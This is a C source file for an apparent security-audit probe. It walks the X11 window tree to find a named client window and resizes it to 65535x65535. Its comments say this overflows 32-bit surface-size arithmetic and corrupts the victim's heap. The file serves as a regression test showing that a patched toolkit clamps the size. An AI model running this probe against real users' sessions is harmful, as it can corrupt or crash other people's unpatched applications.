/* rogue_resize.c — security audit 2026-09: the hostile-geometry probe.
 *
 * Any X client can resize any other client's window (X11 has no
 * per-window ownership check on ConfigureWindow), and X sizes are
 * CARD16 — so one client can hand another a 65535x65535 ConfigureNotify.
 * That size used to reach the toolkit's surface allocation unchecked,
 * where `w + w/4`, `w*h*4` and `dw*4` are 32-bit `unsigned`: the product
 * wraps, a tiny surface is allocated, and the next flush copies rows over
 * the end of it — heap and MIT-SHM-segment corruption in the VICTIM
 * process, which may be the window manager.
 *
 * This probe is the attack: find the named client window under the WM's
 * frame, resize it to 65535x65535, and report what the server now says.
 * The gate's evidence is on the victim's side — it logs the clamp and
 * keeps running, and the session is still usable afterwards.
 */
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/Xatom.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static Display *dpy;

static int
name_of(Window w, char *out, size_t outlen)
{
	Atom net = XInternAtom(dpy, "_NET_WM_NAME", False);
	Atom utf8 = XInternAtom(dpy, "UTF8_STRING", False);
	Atom type = 0;
	int fmt = 0;
	unsigned long n = 0, after = 0;
	unsigned char *data = NULL;
	int ok = 0;

	if (XGetWindowProperty(dpy, w, net, 0, 256, False, utf8, &type, &fmt,
			       &n, &after, &data) == Success && data) {
		if ((int) n < (int) outlen) {
			memcpy(out, data, (size_t) n);
			out[n] = 0;
			ok = 1;
		}
		XFree(data);
		data = NULL;
	}
	if (!ok) {
		char *legacy = NULL;

		if (XFetchName(dpy, w, &legacy) && legacy) {
			snprintf(out, outlen, "%s", legacy);
			XFree(legacy);
			ok = 1;
		}
	}
	return ok;
}

/* depth-first over the tree: the client lives inside the WM's frame */
static Window
find_named(Window w, const char *want, int depth)
{
	Window root, parent, *kids = NULL;
	unsigned int nkids = 0;
	char name[256];

	if (depth > 6) {
		return 0;
	}
	if (name_of(w, name, sizeof(name)) && strcmp(name, want) == 0) {
		return w;
	}
	if (!XQueryTree(dpy, w, &root, &parent, &kids, &nkids)) {
		return 0;
	}
	for (unsigned int i = 0; i < nkids; i++) {
		Window hit = find_named(kids[i], want, depth + 1);

		if (hit) {
			XFree(kids);
			return hit;
		}
	}
	if (kids) {
		XFree(kids);
	}
	return 0;
}

int
main(int argc, char **argv)
{
	const char *want = argc > 1 ? argv[1] : "Widget Zoo";
	Window target;
	Window root;
	unsigned int w = 0, h = 0, bw = 0, depth = 0;
	int x = 0, y = 0;

	dpy = XOpenDisplay(NULL);
	if (!dpy) {
		printf("ROGUE: no display\n");
		return 1;
	}
	root = DefaultRootWindow(dpy);
	/* The CLIENT, not the frame: the WM logs `manage 0x<client> '<title>'
	 * frame=0x<frame>`, and the case passes that client id in.  Resizing
	 * the frame instead would be a ConfigureRequest the WM simply
	 * ignores (measured: the frame stayed 1248x744 and no client ever saw
	 * a hostile size) — the attack has to hit the client window itself,
	 * which is a grandchild of the root and therefore not redirected. */
	if (argc > 1 && argv[1][0] >= '0' && argv[1][0] <= '9') {
		target = (Window) strtoul(argv[1], NULL, 0);
		want = argc > 2 ? argv[2] : "client";
	} else {
		target = find_named(root, want, 0);
	}
	if (!target) {
		printf("ROGUE: no window named '%s'\n", want);
		return 1;
	}
	printf("ROGUE: target 0x%lx '%s'\n", (unsigned long) target, want);
	fflush(stdout);

	/* the attack: a protocol-legal but absurd size */
	XResizeWindow(dpy, target, 65535, 65535);
	XSync(dpy, False);
	usleep(500000);
	if (XGetGeometry(dpy, target, &root, &x, &y, &w, &h, &bw, &depth)) {
		printf("ROGUE: server now reports %ux%u (client-side surface is "
		       "clamped; the window itself is the server's to keep)\n",
		       w, h);
	}
	printf("ROGUE-DONE\n");
	fflush(stdout);
	XCloseDisplay(dpy);
	return 0;
}
